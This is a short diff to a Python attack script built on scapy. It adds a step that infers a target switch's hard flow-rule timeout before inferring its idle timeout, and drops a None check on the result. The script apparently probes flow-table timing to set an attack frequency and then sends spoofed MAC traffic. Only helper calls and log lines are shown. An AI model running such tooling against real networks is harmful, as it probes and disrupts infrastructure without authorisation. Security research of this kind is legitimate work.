@@ -9,7 +9,10 @@ from scapy.all import sendp
 from ftf_utils import FTFUtils
 
 def stage_0(dst_ip, max_iter=1000, max_interval=100):
-    af = FTFUtils.estimate_idle_timeout(dst_ip, max_iter, max_interval)
+    hard_timeout = FTFUtils.estimate_hard_timeout(dst_ip, max_iter, max_interval)
+    print(f"[*] T_hard={hard_timeout}", flush=True)
+    time.sleep(hard_timeout)
+    af = FTFUtils.estimate_idle_timeout(dst_ip, max_iter, hard_timeout)
     print(f"[*] T_idle={af}", flush=True)
     return af
 
@@ -63,11 +66,8 @@ def main():
     parser.add_argument('--max-interval', type=int, default=100)
     args = parser.parse_args()
 
-    print("# [STAGE 0] Tidle Inference", flush=True)
+    print("# [STAGE 0] T_idle Inference", flush=True)
     attack_frequency = stage_0(args.dst_ip, args.max_iter, args.max_interval)
-    if attack_frequency is None:
-        print("# [STAGE 0] Error T_idle is none", flush=True)
-        return
 
     print("# [STAGE 1] MAC Presenting", flush=True)
     macs = stage_1(args.iface, args.npacket, args.anp, attack_frequency)
